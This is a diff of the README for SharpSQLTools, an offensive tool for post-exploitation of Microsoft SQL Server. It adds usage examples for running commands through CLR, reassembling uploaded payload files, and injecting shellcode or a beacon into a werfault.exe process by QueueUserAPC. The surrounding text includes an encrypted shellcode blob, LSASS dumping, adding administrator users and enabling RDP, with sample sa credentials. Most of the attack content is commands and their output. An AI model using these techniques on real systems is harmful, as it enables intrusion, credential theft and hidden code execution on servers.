@@ -23,8 +23,8 @@
 
 Usage:
 
-SharpSQLTools target username password database                   - interactive console
-SharpSQLTools target username password database module command    - non-interactive console
+SharpSQLTools target:port username password database                   - interactive console
+SharpSQLTools target:port username password database module command    - non-interactive console
 
 Module:
 
@@ -40,7 +40,9 @@ enable_clr                 - you know what it means
 disable_clr                - you know what it means
 install_clr                - create assembly and procedure
 uninstall_clr              - drop clr
-clr_dumplsass              - dumplsass by clr
+clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
+clr_dumplsass {path}       - dumplsass by clr
 clr_rdp                    - check RDP port and Enable RDP
 clr_getav                  - get anti-virus software on this machin by clr
 clr_adduser {user} {pass}  - add user by clr
@@ -57,8 +59,8 @@ exit                       - terminates the server process (and this session)
 支持交互模式与非交互模式，交互模式直接跟目标，用户名和密码即可。非交互模式直接跟模块与命令。
 
 ```
-SharpSQLTools target username password database                   - interactive console
-SharpSQLTools target username password database module command    - non-interactive console
+SharpSQLTools target:port username password database                   - interactive console
+SharpSQLTools target:port username password database module command    - non-interactive console
 ```
 
 
@@ -84,6 +86,35 @@ nt authority\system
 nt service\mssqlserver
 ```
 
+#### clr执行命令
+
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec whoami
+[*] Database connection is successful!
+[+] Process: cmd.exe
+[+] arguments:  /c whoami
+[+] RunCommand: cmd.exe  /c whoami
+
+nt service\mssql$sqlexpress
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec -p c:\windows/system32\whoami.exe
+[*] Database connection is successful!
+[+] Process: c:\windows/system32\whoami.exe
+[+] arguments:
+[+] RunCommand: c:\windows/system32\whoami.exe
+
+nt service\mssql$sqlexpress
+
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_exec -p c:\cmd.exe -a /c whoami
+[*] Database connection is successful!
+[+] Process: c:\cmd.exe
+[+] arguments:  /c whoami
+[+] RunCommand: c:\cmd.exe   /c whoami
+
+nt service\mssql$sqlexpress
+
+```
+
 #### clr_scloader
 ```
 λ python Encrypt.py -f nc.bin -k 1234
@@ -94,7 +125,7 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] Database connection is successful!
 [+] EncryptShellcode: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMeE3Xw+z51MPPR2WNzYny6YBO/cw57NeG5s7wxMjN8tPJHU3kz42S6eitwunITfTDi0GJ5zfp1uga7fDDkfgX4egL0nXPy/TxzMvUJ0kbFfTF/EDl3CuVE6mtwunIXfTDiVXW6PntwunIvfTDicr81uns14XNrdWlsam5wanJtcGh7t90ScmbO0mt1aGh7vyPbZMvOzW59j0VABm4BATQxc2V9uNR7td2SMjQxe7rReI4xNDgv85wxV3JgeLvXeLjDco59RRUzzud/vdtaMjUxMmp1ixuzXzHN5mRhfwL9fAPzfM7ye73zesz0ebvydYvYPOvRzeZ8uPVZJHBqf73TerrNcIiqkUVTzOF5s/d0MzIzfYlRXlAxMjM0MXNjdWF6utZmZWR5APJZOWhzY9bNVPRwFWYyNXm/dxAp9DNcebvVYmFzY3Vhc2N9zvJyZHjN+3m483+98HOJTf0NtcvkegLmec35vz9ziTy2L1PL5InDgZNkco6Xp46pzud7t/UaDzJNOLPP0Uc2j3YhQVtbMmp1uOjM4Q==
 [+] XorKey: 1234
-[+] StartProcess notepad.exe
+[+] StartProcess werfault.exe
 [+] OpenProcess Pid: 2508
 [+] VirtualAllocEx Success
 [+] QueueUserAPC Inject shellcode to PID: 2508 Success
@@ -104,6 +135,36 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] QueueUserAPC Inject shellcode Success, enjoy!
 ```
 
+#### clr_scloader1
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_scloader1 C:\Users\Public\payload.txt aaaa
+[*] Database connection is successful!
+[+] EncryptShellcodePath: C:\Users\Public\payload.txt
+[+] XorKey: aaaa
+[+] StartProcess werfault.exe
+[+] OpenProcess Pid: 3232
+[+] VirtualAllocEx Success
+[+] QueueUserAPC Inject shellcode to PID: 3232 Success
+[+] hOpenProcessClose Success
+
+
+[*] QueueUserAPC Inject shellcode Success, enjoy!
+```
+
+#### clr_scloader2
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_scloader2 C:\Users\Public\beacon.bin
+[*] Database connection is successful!
+[+] ShellcodePath: C:\Users\Public\beacon.bin
+[+] StartProcess werfault.exe
+[+] OpenProcess Pid: 332
+[+] VirtualAllocEx Success
+[+] QueueUserAPC Inject shellcode to PID: 332 Success
+[+] hOpenProcessClose Success
+
+
+[*] QueueUserAPC Inject shellcode Success, enjoy!
+```
 
 #### clr_dumplsass
 
@@ -153,7 +214,15 @@ Result: zXqw0MHa8zQxMnJlcGJhZWd6AuZUerhmUXq4Zil6uGYRerhGYXo8g3t4fgX4egL0nQ5SSDMe
 [*] Adding Group Member success
 ```
 
-
+#### clr_combine
+```
+λ SharpSQLTools.exe 192.168.247.139 sa 1qaz@WSX master clr_combine C:\Users\Public\payload.txt
+[*] Database connection is successful!
+[+] remoteFile: C:\Users\Public\payload.txt
+[+] count: 5
+[+] combinefile: C:\Users\Public\payload.txt_*.config_txt C:\Users\Public\payload.txt
+[*] 'C:\Users\Public\payload.txt_*.config_txt' CombineFile completed	
+```
 
 #### clr_download
 
